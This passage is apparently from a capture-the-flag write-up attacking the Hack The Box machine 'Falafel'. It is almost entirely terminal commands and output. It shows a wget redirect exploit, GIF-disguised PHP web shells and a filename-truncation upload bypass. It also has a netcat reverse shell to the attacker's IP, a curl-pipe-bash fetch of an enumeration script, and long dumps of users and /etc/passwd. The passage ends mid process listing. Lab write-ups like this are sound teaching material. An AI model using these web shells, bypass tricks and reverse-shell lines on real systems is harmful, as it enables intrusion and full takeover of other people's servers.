==> SIZE shell.php ... 27
==> PASV ... done.    ==> RETR shell.php ... done.
Length: 27 (unauthoritative)

shell.php.1               100%[==================================>]      27  --.-KB/s    in 0s

2018-06-24 18:03:10 (201 KB/s) - ‘shell.php.1’ saved [27]

root@kali:~/falafet/wget#
```

![](images/23.png)

`shell.php`

```gif
GIF87a
<? echo passthru($_GET['cmd']); ?>
```

```sh
root@kali:~/falafet/wget# python -m pyftpdlib -p21 -w
/usr/local/lib/python2.7/dist-packages/pyftpdlib/authorizers.py:244: RuntimeWarning: write permissions assigned to anonymous user.
  RuntimeWarning)
[I 2018-06-24 18:10:22] >>> starting FTP server on 0.0.0.0:21, pid=5459 <<<
[I 2018-06-24 18:10:22] concurrency model: async
[I 2018-06-24 18:10:22] masquerade (NAT) address: None
[I 2018-06-24 18:10:22] passive ports: None
[I 2018-06-24 18:10:32] 10.10.14.16:51960-[] FTP session opened (connect)
[I 2018-06-24 18:10:44] 10.10.10.73:60778-[] FTP session opened (connect)
[I 2018-06-24 18:10:45] 10.10.10.73:60778-[anonymous] USER 'anonymous' logged in.
[I 2018-06-24 18:10:46] 10.10.10.73:60778-[anonymous] RETR /root/falafet/wget/shell.php completed=1 bytes=42 seconds=0.002
[I 2018-06-24 18:10:46] 10.10.10.73:60778-[anonymous] FTP session closed (disconnect).
```

```sh
root@kali:~/falafet/wget# python wget-exploit.py
Ready? Is your FTP server running?
FTP found open on 10.10.14.16:21. Let's go then

Serving wget exploit on port 80...


We have a volunteer requesting /shell.gif by GET :)

Uploading .wgetrc via ftp redirect vuln. It should land in /root

10.10.10.73 - - [24/Jun/2018 18:10:44] "GET /shell.gif HTTP/1.1" 301 -
Sending redirect to ftp://anonymous@10.10.14.16:21/shell.php
```

![](images/24.png)

![](images/25.png)

![](images/26.png)

![](images/27.png)

![](images/21.png)

![](images/28.png)

```sh
root@kali:~/falafet/wget# /usr/bin/msf-pattern_create -l 255
Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4
root@kali:~/falafet/wget#
```

```sh
root@kali:~/falafet# mkdir www
root@kali:~/falafet# cd www
root@kali:~/falafet/www# touch Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai.gif
root@kali:~/falafet/www# cat Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai.gif
GIF8;
root@kali:~/falafet/www#
root@kali:~/falafet/www# file Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai.gif
Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai.gif: GIF image data
root@kali:~/falafet/www#
```

```sh
root@kali:~/falafet/www# python
Python 2.7.15 (default, May  1 2018, 05:55:50)
[GCC 7.3.0] on linux2
Type "help", "copyright", "credits" or "license" for more information.
>>> len("Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai.gif")
255
>>>
root@kali:~/falafet/www#
```

![](images/29.png)

![](images/30.png)

![](images/31.png)

```sh
root@kali:~/falafet/www# python -m SimpleHTTPServer 80
Serving HTTP on 0.0.0.0 port 80 ...
10.10.10.73 - - [24/Jun/2018 18:19:53] "GET /Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai.gif HTTP/1.1" 200 -
```

```sh
root@kali:~/falafet/www# python
Python 2.7.15 (default, May  1 2018, 05:55:50)
[GCC 7.3.0] on linux2
Type "help", "copyright", "credits" or "license" for more information.
>>> len("Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah")
236
>>>
root@kali:~/falafet/www#
```

```sh
root@kali:~/falafet/www# python -c "print 'A'*232"
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
root@kali:~/falafet/www#
```

```sh
root@kali:~/falafet/www# cat AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA.php.gif
<?php echo system($_REQUEST['ipp']); ?>
root@kali:~/falafet/www#
```

```sh
root@kali:~/falafet/www# python -m SimpleHTTPServer 80
Serving HTTP on 0.0.0.0 port 80 ...
10.10.10.73 - - [24/Jun/2018 18:29:07] "GET /AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA.php.gif HTTP/1.1" 200 -
```

![](images/32.png)

![](images/33.png)

![](images/34.png)

![](images/35.png)

```
http://10.10.10.73/uploads/0625-0128_0833eb97710a5b43/AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA.php?ipp=whoami
```

![](images/36.png)

![](images/37.png)

![](images/38.png)

![](images/39.png)

###### Reverse Shell

[`Reverse Shell Cheat Sheet`](http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet)

```
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.16 8001 >/tmp/f
```

![](images/40.png)

[`Upgrading simple shells to fully interactive TTYs`](https://blog.ropnop.com/upgrading-simple-shells-to-fully-interactive-ttys/)

```sh
root@kali:~/falafet/www# nc -nlvp 8001
Ncat: Version 7.70 ( https://nmap.org/ncat )
Ncat: Listening on :::8001
Ncat: Listening on 0.0.0.0:8001
Ncat: Connection from 10.10.10.73.
Ncat: Connection from 10.10.10.73:32908.
/bin/sh: 0: can't access tty; job control turned off
$ python3 -c 'import pty; pty.spawn("/bin/bash")'
www-data@falafel:/var/www/html/uploads/0625-0128_0833eb97710a5b43$ ^Z
[1]+  Stopped                 nc -nlvp 8001
root@kali:~/falafet/www# echo $TERM
xterm-256color
root@kali:~/falafet/www# stty -a
speed 38400 baud; rows 51; columns 204; line = 0;
intr = ^C; quit = ^\; erase = ^?; kill = ^U; eof = ^D; eol = M-^?; eol2 = M-^?; swtch = <undef>; start = ^Q; stop = ^S; susp = ^Z; rprnt = ^R; werase = ^W; lnext = ^V; discard = ^O; min = 1; time = 0;
-parenb -parodd -cmspar cs8 -hupcl -cstopb cread -clocal -crtscts
-ignbrk -brkint -ignpar -parmrk -inpck -istrip -inlcr -igncr icrnl ixon -ixoff -iuclc ixany imaxbel iutf8
opost -olcuc -ocrnl onlcr -onocr -onlret -ofill -ofdel nl0 cr0 tab0 bs0 vt0 ff0
isig icanon iexten echo echoe echok -echonl -noflsh -xcase -tostop -echoprt echoctl echoke -flusho -extproc
root@kali:~/falafet/www# stty raw -echo
root@kali:~/falafet/www# nc -nlvp 8001
                                      reset
reset: unknown terminal type unknown
Terminal type? xterm-256color

<tml/uploads/0625-0128_0833eb97710a5b43$ export SHELL=bash
<tml/uploads/0625-0128_0833eb97710a5b43$ stty rows 51 columns 204
www-data@falafel:/var/www/html/uploads/0625-0128_0833eb97710a5b43$
www-data@falafel:/var/www/html/uploads/0625-0128_0833eb97710a5b43$ cd ~
www-data@falafel:/var/www$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
www-data@falafel:/var/www$ hostname
falafel
www-data@falafel:/var/www$
```

```sh
root@kali:~/falafet/www# git clone https://github.com/rebootuser/LinEnum.git
Cloning into 'LinEnum'...
remote: Counting objects: 134, done.
remote: Compressing objects: 100% (18/18), done.
remote: Total 134 (delta 8), reused 5 (delta 2), pack-reused 114
Receiving objects: 100% (134/134), 83.55 KiB | 1.74 MiB/s, done.
Resolving deltas: 100% (56/56), done.
root@kali:~/falafet/www# cd LinEnum/
root@kali:~/falafet/www/LinEnum# ls
CHANGELOG.md  CONTRIBUTORS.md  LICENSE  LinEnum.sh  README.md
root@kali:~/falafet/www/LinEnum# python -m SimpleHTTPServer 80
Serving HTTP on 0.0.0.0 port 80 ...
10.10.10.73 - - [24/Jun/2018 18:46:34] "GET /LinEnum.sh HTTP/1.1" 200 -
```

```sh
www-data@falafel:/var/www$ curl http://10.10.14.16/LinEnum.sh | bash
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100 44413  100 44413    0     0  40754      0  0:00:01  0:00:01 --:--:-- 40783

#########################################################
# Local Linux Enumeration & Privilege Escalation Script #
#########################################################
# www.rebootuser.com
# version 0.91

[-] Debug Info
[+] Thorough tests = Disabled (SUID/GUID checks will not be perfomed!)


Scan started at:
Mon Jun 25 01:45:57 IDT 2018


### SYSTEM ##############################################
[-] Kernel information:
Linux falafel 4.4.0-112-generic #135-Ubuntu SMP Fri Jan 19 11:48:36 UTC 2018 x86_64 x86_64 x86_64 GNU/Linux


[-] Kernel information (continued):
Linux version 4.4.0-112-generic (buildd@lgw01-amd64-010) (gcc version 5.4.0 20160609 (Ubuntu 5.4.0-6ubuntu1~16.04.5) ) #135-Ubuntu SMP Fri Jan 19 11:48:36 UTC 2018


[-] Specific release information:
DISTRIB_ID=Ubuntu
DISTRIB_RELEASE=16.04
DISTRIB_CODENAME=xenial
DISTRIB_DESCRIPTION="Ubuntu 16.04.3 LTS"
NAME="Ubuntu"
VERSION="16.04.3 LTS (Xenial Xerus)"
ID=ubuntu
ID_LIKE=debian
PRETTY_NAME="Ubuntu 16.04.3 LTS"
VERSION_ID="16.04"
HOME_URL="http://www.ubuntu.com/"
SUPPORT_URL="http://help.ubuntu.com/"
BUG_REPORT_URL="http://bugs.launchpad.net/ubuntu/"
VERSION_CODENAME=xenial
UBUNTU_CODENAME=xenial


[-] Hostname:
falafel


### USER/GROUP ##########################################
[-] Current user/group info:
uid=33(www-data) gid=33(www-data) groups=33(www-data)


[-] Users that have previously logged onto the system:
Username         Port     From             Latest
root             pts/0    10.10.14.4       Tue May  1 20:14:09 +0300 2018
yossi            tty1                      Mon Jun 18 05:18:09 +0300 2018
moshe            pts/0    10.10.14.2       Mon Feb  5 23:35:10 +0200 2018


[-] Who else is logged on:
 01:45:57 up 6 days, 20:28,  1 user,  load average: 0.00, 0.00, 0.00
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
yossi    tty1                      18Jun18  6days  0.03s  0.03s -bash


[-] Group memberships:
uid=0(root) gid=0(root) groups=0(root)
uid=1(daemon) gid=1(daemon) groups=1(daemon)
uid=2(bin) gid=2(bin) groups=2(bin)
uid=3(sys) gid=3(sys) groups=3(sys)
uid=4(sync) gid=65534(nogroup) groups=65534(nogroup)
uid=5(games) gid=60(games) groups=60(games)
uid=6(man) gid=12(man) groups=12(man)
uid=7(lp) gid=7(lp) groups=7(lp)
uid=8(mail) gid=8(mail) groups=8(mail)
uid=9(news) gid=9(news) groups=9(news)
uid=10(uucp) gid=10(uucp) groups=10(uucp)
uid=13(proxy) gid=13(proxy) groups=13(proxy)
uid=33(www-data) gid=33(www-data) groups=33(www-data)
uid=34(backup) gid=34(backup) groups=34(backup)
uid=38(list) gid=38(list) groups=38(list)
uid=39(irc) gid=39(irc) groups=39(irc)
uid=41(gnats) gid=41(gnats) groups=41(gnats)
uid=65534(nobody) gid=65534(nogroup) groups=65534(nogroup)
uid=100(systemd-timesync) gid=102(systemd-timesync) groups=102(systemd-timesync)
uid=101(systemd-network) gid=103(systemd-network) groups=103(systemd-network)
uid=102(systemd-resolve) gid=104(systemd-resolve) groups=104(systemd-resolve)
uid=103(systemd-bus-proxy) gid=105(systemd-bus-proxy) groups=105(systemd-bus-proxy)
uid=104(syslog) gid=108(syslog) groups=108(syslog),4(adm)
uid=105(_apt) gid=65534(nogroup) groups=65534(nogroup)
uid=106(lxd) gid=65534(nogroup) groups=65534(nogroup)
uid=107(messagebus) gid=111(messagebus) groups=111(messagebus)
uid=108(uuidd) gid=112(uuidd) groups=112(uuidd)
uid=109(dnsmasq) gid=65534(nogroup) groups=65534(nogroup)
uid=110(sshd) gid=65534(nogroup) groups=65534(nogroup)
uid=111(postgres) gid=116(postgres) groups=116(postgres),115(ssl-cert)
uid=1000(yossi) gid=1000(yossi) groups=1000(yossi),4(adm),6(disk),24(cdrom),30(dip),46(plugdev),117(lpadmin),118(sambashare)
uid=112(mysql) gid=119(mysql) groups=119(mysql)
uid=1001(moshe) gid=1001(moshe) groups=1001(moshe),4(adm),8(mail),9(news),22(voice),25(floppy),29(audio),44(video),60(games)


[-] It looks like we have some admin users:
uid=104(syslog) gid=108(syslog) groups=108(syslog),4(adm)
uid=1000(yossi) gid=1000(yossi) groups=1000(yossi),4(adm),6(disk),24(cdrom),30(dip),46(plugdev),117(lpadmin),118(sambashare)
uid=1001(moshe) gid=1001(moshe) groups=1001(moshe),4(adm),8(mail),9(news),22(voice),25(floppy),29(audio),44(video),60(games)


[-] Contents of /etc/passwd:
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-timesync:x:100:102:systemd Time Synchronization,,,:/run/systemd:/bin/false
systemd-network:x:101:103:systemd Network Management,,,:/run/systemd/netif:/bin/false
systemd-resolve:x:102:104:systemd Resolver,,,:/run/systemd/resolve:/bin/false
systemd-bus-proxy:x:103:105:systemd Bus Proxy,,,:/run/systemd:/bin/false
syslog:x:104:108::/home/syslog:/bin/false
_apt:x:105:65534::/nonexistent:/bin/false
lxd:x:106:65534::/var/lib/lxd/:/bin/false
messagebus:x:107:111::/var/run/dbus:/bin/false
uuidd:x:108:112::/run/uuidd:/bin/false
dnsmasq:x:109:65534:dnsmasq,,,:/var/lib/misc:/bin/false
sshd:x:110:65534::/var/run/sshd:/usr/sbin/nologin
postgres:x:111:116:PostgreSQL administrator,,,:/var/lib/postgresql:/bin/bash
yossi:x:1000:1000:Yossi,,,:/home/yossi:/bin/bash
mysql:x:112:119:MySQL Server,,,:/nonexistent:/bin/false
moshe:x:1001:1001::/home/moshe:


[-] Super user account(s):
root


[-] Are permissions on /home directories lax:
total 16K
drwxr-xr-x  4 root  root  4.0K Nov 27  2017 .
drwxr-xr-x 23 root  root  4.0K Feb  5 17:20 ..
drwx------  3 moshe moshe 4.0K Jan 14 21:55 moshe
drwx------  3 yossi yossi 4.0K Jan 14 21:54 yossi


[-] Root is allowed to login via SSH:
PermitRootLogin yes


### ENVIRONMENTAL #######################################
[-] Environment information:
APACHE_PID_FILE=/var/run/apache2/apache2.pid
APACHE_RUN_USER=www-data
SHELL=bash
PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
APACHE_LOG_DIR=/var/log/apache2
PWD=/var/www
LANG=C
APACHE_RUN_GROUP=www-data
SHLVL=2
APACHE_RUN_DIR=/var/run/apache2
APACHE_LOCK_DIR=/var/lock/apache2
_=/usr/bin/env


[-] Path information:
/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin


[-] Available shells:
# /etc/shells: valid login shells
/bin/sh
/bin/dash
/bin/bash
/bin/rbash
/usr/bin/tmux
/usr/bin/screen


[-] Current umask value:
0022
u=rwx,g=rx,o=rx


[-] umask value as specified in /etc/login.defs:
UMASK		022


[-] Password and storage information:
PASS_MAX_DAYS	99999
PASS_MIN_DAYS	0
PASS_WARN_AGE	7
ENCRYPT_METHOD SHA512


### JOBS/TASKS ##########################################
[-] Cron jobs:
-rw-r--r-- 1 root root  722 Apr  6  2016 /etc/crontab

/etc/cron.d:
total 28
drwxr-xr-x  2 root root 4096 Jan 11 19:43 .
drwxr-xr-x 96 root root 4096 May  1 20:12 ..
-rw-r--r--  1 root root  102 Apr  6  2016 .placeholder
-rw-r--r--  1 root root  589 Jul 16  2014 mdadm
-rw-r--r--  1 root root  670 Mar  1  2016 php
-rw-r--r--  1 root root  191 Nov 27  2017 popularity-contest
-rw-r--r--  1 root root  396 Jan 28  2016 sysstat

/etc/cron.daily:
total 64
drwxr-xr-x  2 root root 4096 Feb  5 17:19 .
drwxr-xr-x 96 root root 4096 May  1 20:12 ..
-rw-r--r--  1 root root  102 Apr  6  2016 .placeholder
-rwxr-xr-x  1 root root  539 Apr  6  2016 apache2
-rwxr-xr-x  1 root root  376 Mar 31  2016 apport
-rwxr-xr-x  1 root root 1474 Jun 19  2017 apt-compat
-rwxr-xr-x  1 root root  355 May 22  2012 bsdmainutils
-rwxr-xr-x  1 root root 1597 Nov 27  2015 dpkg
-rwxr-xr-x  1 root root  372 May  6  2015 logrotate
-rwxr-xr-x  1 root root 1293 Nov  6  2015 man-db
-rwxr-xr-x  1 root root  539 Jul 16  2014 mdadm
-rwxr-xr-x  1 root root  435 Nov 18  2014 mlocate
-rwxr-xr-x  1 root root  249 Nov 13  2015 passwd
-rwxr-xr-x  1 root root 3449 Feb 26  2016 popularity-contest
-rwxr-xr-x  1 root root  441 Jan 28  2016 sysstat
-rwxr-xr-x  1 root root  214 May 24  2016 update-notifier-common

/etc/cron.hourly:
total 12
drwxr-xr-x  2 root root 4096 Nov 27  2017 .
drwxr-xr-x 96 root root 4096 May  1 20:12 ..
-rw-r--r--  1 root root  102 Apr  6  2016 .placeholder

/etc/cron.monthly:
total 12
drwxr-xr-x  2 root root 4096 Nov 27  2017 .
drwxr-xr-x 96 root root 4096 May  1 20:12 ..
-rw-r--r--  1 root root  102 Apr  6  2016 .placeholder

/etc/cron.weekly:
total 24
drwxr-xr-x  2 root root 4096 Feb  5 17:19 .
drwxr-xr-x 96 root root 4096 May  1 20:12 ..
-rw-r--r--  1 root root  102 Apr  6  2016 .placeholder
-rwxr-xr-x  1 root root   86 Apr 13  2016 fstrim
-rwxr-xr-x  1 root root  771 Nov  6  2015 man-db
-rwxr-xr-x  1 root root  211 May 24  2016 update-notifier-common


[-] Crontab contents:
# /etc/crontab: system-wide crontab
# Unlike any other crontab you don't have to run the `crontab'
# command to install the new version when you edit this file
# and files in /etc/cron.d. These files also have username fields,
# that none of the other crontabs do.

SHELL=/bin/sh
PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin

# m h dom mon dow user	command
17 *	* * *	root    cd / && run-parts --report /etc/cron.hourly
25 6	* * *	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
47 6	* * 7	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
52 6	1 * *	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )
#


### NETWORKING  ##########################################
[-] Network and IP info:
ens33     Link encap:Ethernet  HWaddr 00:50:56:8f:80:63
          inet addr:10.10.10.73  Bcast:10.10.10.255  Mask:255.255.255.0
          UP BROADCAST RUNNING MULTICAST  MTU:1500  Metric:1
          RX packets:559429 errors:0 dropped:259 overruns:0 frame:0
          TX packets:451679 errors:0 dropped:0 overruns:0 carrier:0
          collisions:0 txqueuelen:1000
          RX bytes:60122162 (60.1 MB)  TX bytes:222965481 (222.9 MB)

lo        Link encap:Local Loopback
          inet addr:127.0.0.1  Mask:255.0.0.0
          UP LOOPBACK RUNNING  MTU:65536  Metric:1
          RX packets:462179 errors:0 dropped:0 overruns:0 frame:0
          TX packets:462179 errors:0 dropped:0 overruns:0 carrier:0
          collisions:0 txqueuelen:1
          RX bytes:41339402 (41.3 MB)  TX bytes:41339402 (41.3 MB)


[-] ARP history:
? (10.10.10.2) at 00:50:56:8f:64:fe [ether] on ens33


[-] Nameserver(s):
nameserver 10.10.10.2


[-] Default route:
default         10.10.10.2      0.0.0.0         UG    0      0        0 ens33


[-] Listening TCP:
Active Internet connections (servers and established)
Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name
tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      -
tcp        0      0 127.0.0.1:3306          0.0.0.0:*               LISTEN      -
tcp        0      0 0.0.0.0:80              0.0.0.0:*               LISTEN      -
tcp        0    116 10.10.10.73:32908       10.10.14.16:8001        ESTABLISHED 4516/nc
tcp        1      0 10.10.10.73:80          10.10.14.16:39988       CLOSE_WAIT  -
tcp6       0      0 :::22                   :::*                    LISTEN      -


[-] Listening UDP:
Active Internet connections (servers and established)
Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name
udp        0      0 10.10.10.73:46411       10.10.10.2:53           ESTABLISHED -


### SERVICES #############################################
[-] Running processes:
USER       PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND
root         1  0.0  0.6  38056  6124 ?        Ss   Jun18   0:27 /sbin/init
root         2  0.0  0.0      0     0 ?        S    Jun18   0:00 [kthreadd]
root         3  0.0  0.0      0     0 ?        S    Jun18   0:02 [ksoftirqd/0]
root         5  0.0  0.0      0     0 ?        S<   Jun18   0:00 [kworker/0:0H]
root         7  0.0  0.0      0     0 ?        S    Jun18   1:52 [rcu_sched]
root         8  0.0  0.0      0     0 ?        S    Jun18   0:00 [rcu_bh]
root         9  0.0  0.0      0     0 ?        S    Jun18   0:00 [migration/0]
root        10  0.0  0.0      0     0 ?        S    Jun18   0:02 [watchdog/0]
root        11  0.0  0.0      0     0 ?        S    Jun18   0:00 [kdevtmpfs]
root        12  0.0  0.0      0     0 ?        S<   Jun18   0:00 [netns]
root        13  0.0  0.0      0     0 ?        S<   Jun18   0:00 [perf]
root        14  0.0  0.0      0     0 ?        S    Jun18   0:00 [khungtaskd]
root        15  0.0  0.0      0     0 ?        S<   Jun18   0:00 [writeback]
root        16  0.0  0.0      0     0 ?        SN   Jun18   0:00 [ksmd]
root        17  0.0  0.0      0     0 ?        SN   Jun18   0:02 [khugepaged]
root        18  0.0  0.0      0     0 ?        S<   Jun18   0:00 [crypto]
root        19  0.0  0.0      0     0 ?        S<   Jun18   0:00 [kintegrityd]
root        20  0.0  0.0      0     0 ?        S<   Jun18   0:00 [bioset]
root        21  0.0  0.0      0     0 ?        S<   Jun18   0:00 [kblockd]
root        22  0.0  0.0      0     0 ?        S<   Jun18   0:00 [ata_sff]
root        23  0.0  0.0      0     0 ?        S<   Jun18   0:00 [md]
root        24  0.0  0.0      0     0 ?        S<   Jun18   0:00 [devfreq_wq]
root        26  0.0  0.0      0     0 ?        S    Jun18   7:31 [kworker/0:1]
root        28  0.0  0.0      0     0 ?        S    Jun18   0:00 [kswapd0]
root        29  0.0  0.0      0     0 ?        S<   Jun18   0:00 [vmstat]
root        30  0.0  0.0      0     0 ?        S    Jun18   0:00 [fsnotify_mark]
root        31  0.0  0.0      0     0 ?        S    Jun18   0:00 [ecryptfs-kthrea]
root        47  0.0  0.0      0     0 ?        S<   Jun18   0:00 [kthrotld]
root        48  0.0  0.0      0     0 ?        S<   Jun18   0:00 [acpi_thermal_pm]
root        49  0.0  0.0      0     0 ?        S<   Jun18   0:00 [bioset]
root        50  0.0  0.0      0     0 ?        S<   Jun18   0:00 [bioset]
root        51  0.0  0.0      0     0 ?        S<   Jun18   0:00 [bioset]
root        52  0.0  0.0      0     0 ?        S<   Jun18   0:00 [bioset]
root        53  0.0  0.0      0     0 ?        S<   Jun18   0:00 [bioset]
root        54  0.0  0.0      0     0 ?        S<   Jun18   0:00 [bioset]
root        55  0.0  0.0      0     0 ?        S<   Jun18   0:00 [bioset]
